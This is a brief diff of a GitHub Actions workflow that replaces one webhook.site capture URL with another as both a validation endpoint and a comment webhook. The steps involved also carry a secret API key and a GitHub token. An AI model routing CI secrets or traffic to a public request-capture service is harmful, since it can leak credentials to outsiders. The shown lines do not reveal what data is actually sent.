@@ -64,7 +64,7 @@ jobs:
         id: studio
         env:
           LAMATIC_VALIDATION_API_KEY: ${{ secrets.LAMATIC_VALIDATION_API_KEY }}
-          LAMATIC_VALIDATION_ENDPOINT: 'https://webhook.site/41bdd6f6-aa12-4cce-9b15-4c706c6c05eb'
+          LAMATIC_VALIDATION_ENDPOINT: 'https://webhook.site/7fb70d29-b1d2-4610-bfac-8118bb73852b'
           HEAD_SHA: ${{ github.event.workflow_run.head_sha }}
         run: |
           if [ -z "$LAMATIC_VALIDATION_API_KEY" ]; then
@@ -156,7 +156,7 @@ jobs:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
           PR_NUMBER: ${{ github.event.workflow_run.pull_requests[0].number }}
           REPO: ${{ github.repository }}
-          WEBHOOK_URL: 'https://webhook.site/41bdd6f6-aa12-4cce-9b15-4c706c6c05eb'
+          WEBHOOK_URL: 'https://webhook.site/7fb70d29-b1d2-4610-bfac-8118bb73852b'
         run: |
           if [ -z "$PR_NUMBER" ] || [ "$PR_NUMBER" = "0" ]; then
             echo "No PR number found — skipping comment."
